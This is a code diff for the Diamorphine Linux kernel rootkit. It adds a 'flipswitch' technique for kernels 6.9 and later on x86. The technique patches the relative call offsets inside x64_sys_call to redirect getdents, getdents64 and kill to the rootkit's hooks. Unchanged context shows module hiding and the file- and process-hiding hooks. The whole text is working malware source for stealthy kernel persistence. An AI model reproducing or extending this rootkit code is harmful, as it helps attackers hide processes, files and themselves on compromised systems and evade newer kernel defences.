@@ -3,7 +3,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h> 
+#include <linux/version.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -40,6 +40,11 @@ unsigned long init_begin;
 #define section_size init_begin - start_rodata
 #endif
 static unsigned long *__sys_call_table;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+void *sys_call;
+#endif
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
@@ -83,7 +88,7 @@ unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
-	
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
 	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
 	return syscall_table;
@@ -216,7 +221,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	struct inode *d_inode;
 
 	if (ret <= 0)
-		return ret;	
+		return ret;
 
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
@@ -300,6 +305,7 @@ tidy(void)
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
+
 void
 module_show(void)
 {
@@ -398,6 +404,28 @@ unprotect_memory(void)
 #endif
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+void flipswitch_func(void *target_func, void *hacked_func) {
+	unsigned char *func_ptr = (unsigned char *)sys_call;
+
+	for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
+		if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) {
+			int32_t rel = *(int32_t *)(func_ptr + i + 1);
+			void *call_addr = (void *)((uintptr_t)sys_call + i + 5 + rel);
+
+			if (call_addr == target_func) {
+
+				int32_t new_rel = (uintptr_t)hacked_func - ((uintptr_t)sys_call + i + 5);
+				int hooked_offset = i + 1;
+
+				memcpy(func_ptr + hooked_offset, &new_rel, sizeof(new_rel));
+				break;
+			}
+		}
+	}
+}
+#endif
+
 static int __init
 diamorphine_init(void)
 {
@@ -416,6 +444,12 @@ diamorphine_init(void)
 	module_hide();
 	tidy();
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	sys_call = (t_syscall)resolve_sym("x64_sys_call");
+	if (!sys_call)
+		return -1;
+#endif
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
@@ -427,11 +461,15 @@ diamorphine_init(void)
 #endif
 
 	unprotect_memory();
-
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	flipswitch_func(orig_getdents, hacked_getdents);
+	flipswitch_func(orig_getdents64, hacked_getdents64);
+	flipswitch_func(orig_kill, hacked_kill);
+#else
 	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
+#endif
 	protect_memory();
 
 	return 0;
@@ -440,13 +478,19 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
-	unprotect_memory();
 
+	unprotect_memory();
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	flipswitch_func(hacked_getdents, orig_getdents);
+	flipswitch_func(hacked_getdents64, orig_getdents64);
+	flipswitch_func(hacked_kill, orig_kill);
+#else
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-
+#endif
 	protect_memory();
+
 }
 
 module_init(diamorphine_init);
